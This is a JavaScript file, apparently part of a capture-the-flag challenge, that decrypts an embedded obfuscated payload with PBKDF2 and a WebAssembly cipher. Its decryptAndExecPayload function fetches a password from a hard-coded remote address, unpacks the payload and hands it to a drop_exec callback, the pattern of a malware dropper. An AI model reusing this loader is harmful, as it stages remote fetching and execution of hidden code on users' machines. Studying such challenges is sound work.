/* eslint-disable no-underscore-dangle, no-bitwise */
/* global Module, payload */
async function deriveKey(salt, password) {
    const tc = new TextEncoder('utf-8');
    const passKey = await window.crypto.subtle.importKey('raw', tc.encode(password), 'PBKDF2', false, ['deriveBits']);
    const key = await window.crypto.subtle.deriveBits({
            name: 'PBKDF2',
            salt: salt,
            iterations: 1000000,
            hash: 'SHA-256'
        },
        passKey, 256
    );
    return key;
}

function getFlag(secret) {
    const flagLen = 43;
    const flagPtr = Module._malloc(flagLen + 1);
    if (Module._getFlag(secret, flagPtr)) {
        const flag = Module.HEAPU8.subarray(flagPtr, flagPtr + flagLen);
        console.log(new TextDecoder('utf-8').decode(flag));
    }
    Module._free(flagPtr);
}

async function decryptData(data, password) {
    const salt = data.slice(0, 16);
    let iv = data.slice(16, 32);
    const encrypted = data.slice(32);

    const cipherKey = await deriveKey(salt, password);
    const plaintextBlocks = [];

    // initialize cipher context
    const ctx = Module._malloc(10 * 16);
    const key = Module._malloc(32);
    Module.HEAPU8.set(new Uint8Array(cipherKey), key);
    Module._setDecryptKey(ctx, key);

    // cbc decryption
    const block = Module._malloc(16);

    for (let i = 0; i < encrypted.length / 16; i += 1) {
        const currentBlock = encrypted.slice(16 * i, (16 * i) + 16);
        const temp = currentBlock.slice();

        Module.HEAPU8.set(currentBlock, block);
        Module._decryptBlock(ctx, block);
        currentBlock.set(Module.HEAPU8.subarray(block, block + 16));

        const outputBlock = new Uint8Array(16);
        for (let j = 0; j < outputBlock.length; j += 1) {
            outputBlock[j] = currentBlock[j] ^ iv[j];
        }
        plaintextBlocks.push(outputBlock);
        iv = temp;
    }
    Module._free(block);
    Module._free(ctx);
    Module._free(key);

    const marker = new TextDecoder('utf-8').decode(plaintextBlocks.shift());

    if (marker !== '-Fancy Nounours-') {
        return null;
    }
    const plaintext = new Blob(plaintextBlocks, {
        type: 'image/jpeg'
    });
    return plaintext;
}

function d(x) {
    return ((200 * x * x) + (255 * x) + 92) % 0x100;
}

function deobfuscate(data) {
    const plaintext = new Uint8Array(data);
    for (let i = 0; i < plaintext.length; i += 1) {
        plaintext[i] = d(plaintext[i]);
    }
    return plaintext;
}

function b64ToUint6(nChr) {
    if (nChr > 64 && nChr < 91) {
        return nChr - 65;
    }
    if (nChr > 96 && nChr < 123) {
        return nChr - 71;
    }
    if (nChr > 47 && nChr < 58) {
        return nChr + 4;
    }
    if (nChr === 43) {
        return 62;
    }
    if (nChr === 47) {
        return 63;
    }
    return 0;
}

function base64DecToArr(sBase64) {
    const sB64Enc = sBase64.replace(/[^A-Za-z0-9+/]/g, '');
    const nInLen = sB64Enc.length;
    const nOutLen = (nInLen * 3) + 1 >> 2;
    const taBytes = new Uint8Array(nOutLen);

    let nOutIdx = 0;
    let nUint24 = 0;
    for (let nInIdx = 0; nInIdx < nInLen; nInIdx += 1) {
        const nMod4 = nInIdx & 3;
        nUint24 |= b64ToUint6(sB64Enc.charCodeAt(nInIdx)) << 18 - (6 * nMod4);
        if (nMod4 === 3 || nInLen - nInIdx === 1) {
            for (let nMod3 = 0; nMod3 < 3 && nOutIdx < nOutLen; nMod3 += 1, nOutIdx += 1) {
                taBytes[nOutIdx] = (nUint24 >>> ((16 >>> nMod3) & 24)) & 255;
            }
            nUint24 = 0;
        }
    }

    return taBytes;
}


async function decryptAndExecPayload(drop_exec) {
    // getFlag(0xbad);
    const passwordUrl = 'https://10.241.20.18:1443/password?session=c5bfdf5c-c1e3-4abf-a514-6c8d1cdd56f1';
    const response = await fetch(passwordUrl);
    const blob = await response.blob();

    const passwordReader = new FileReader();
    passwordReader.addEventListener('loadend', () => {
        Module.d = d;
        decryptData(deobfuscate(base64DecToArr(payload)), passwordReader.result).then((payloadBlob) => {
            var fileReader = new FileReader();
            fileReader.onload = function() {
                arrayBuffer = this.result;
                drop_exec(arrayBuffer);
            };
            console.log(payloadBlob);
            fileReader.readAsArrayBuffer(payloadBlob);
        });
    });
    passwordReader.readAsBinaryString(blob);
};